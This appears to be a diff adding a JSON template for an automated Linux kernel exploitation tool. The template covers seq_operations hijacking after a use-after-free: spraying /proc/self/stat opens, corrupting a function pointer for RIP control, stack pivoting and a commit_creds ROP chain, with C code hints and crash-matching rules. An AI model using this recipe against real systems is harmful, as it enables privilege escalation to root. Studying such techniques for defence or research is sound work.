@@ -1,0 +1,50 @@
+{
+  "name": "seq_operations_hijack",
+  "description": "UAF exploited via seq_operations spray. seq_operations is a small struct (32 bytes, kmalloc-32 or kmalloc-64) containing 4 function pointers. Opening /proc/self/stat or similar seq_file-backed proc entries allocates seq_operations. Corrupt a function pointer for RIP control.",
+  "target_struct": "seq_operations",
+  "slab_cache": "kmalloc-32 or kmalloc-64",
+  "technique": "seq_ops_hijack",
+  "vuln_types": ["uaf"],
+  "kernel_versions": "4.4+",
+  "detection_rules": {
+    "required_symbols": ["open", "read", "lseek", "close"],
+    "crash_functions": ["seq_read", "seq_lseek", "single_open", "seq_open"],
+    "slab_caches": ["kmalloc-32", "kmalloc-64"],
+    "struct_fields": ["seq_operations.start", "seq_operations.stop", "seq_operations.next", "seq_operations.show"]
+  },
+  "steps": [
+    {
+      "name": "trigger_uaf",
+      "description": "Trigger the use-after-free on a kmalloc-32/64-sized object.",
+      "code_hint": "// Trigger the vulnerability to free a small slab object"
+    },
+    {
+      "name": "spray_seq_operations",
+      "description": "Open many /proc/self/stat (or other seq_file entries) to spray seq_operations structures in the target slab cache.",
+      "code_hint": "#define SEQ_SPRAY 256\nint seq_fds[SEQ_SPRAY];\nfor (int i = 0; i < SEQ_SPRAY; i++) {\n    seq_fds[i] = open(\"/proc/self/stat\", O_RDONLY);\n}"
+    },
+    {
+      "name": "corrupt_seq_ops_pointer",
+      "description": "Use the dangling pointer to overwrite one of the seq_operations function pointers (start/stop/next/show).",
+      "code_hint": "// seq_operations struct:\n// +0x00: int (*start)(struct seq_file *, loff_t *)\n// +0x08: void (*stop)(struct seq_file *, void *)\n// +0x10: void *(*next)(struct seq_file *, void *, loff_t *)\n// +0x18: int (*show)(struct seq_file *, void *)\n// Overwrite start to control RIP when read() is called"
+    },
+    {
+      "name": "trigger_read_for_rip_control",
+      "description": "Call read() on the seq_file fd to invoke the corrupted function pointer, gaining RIP/PC control.",
+      "code_hint": "char buf[256];\nfor (int i = 0; i < SEQ_SPRAY; i++) {\n    lseek(seq_fds[i], 0, SEEK_SET);  // Reset position\n    read(seq_fds[i], buf, sizeof(buf));  // Triggers start()\n}"
+    },
+    {
+      "name": "stack_pivot",
+      "description": "Use a stack pivot gadget to redirect execution to the ROP chain.",
+      "code_hint": "// seq_operations.start is called with:\n// rdi = seq_file* (partially controlled via lseek)\n// rsi = loff_t* (stack pointer, less useful)\n// Pivot via: xchg rax, rsp; ret  or  mov rsp, [rdi+OFF]; ret"
+    },
+    {
+      "name": "rop_to_commit_creds",
+      "description": "Execute ROP chain for commit_creds(init_cred), then return to userspace.",
+      "code_hint": "// Standard commit_creds ROP chain\n// See pipe_buffer_rop.json for detailed x86_64/aarch64 examples"
+    }
+  ],
+  "references": [
+    "https://lkmidas.github.io/posts/20210123-linux-kernel-pwn-part-1/"
+  ]
+}
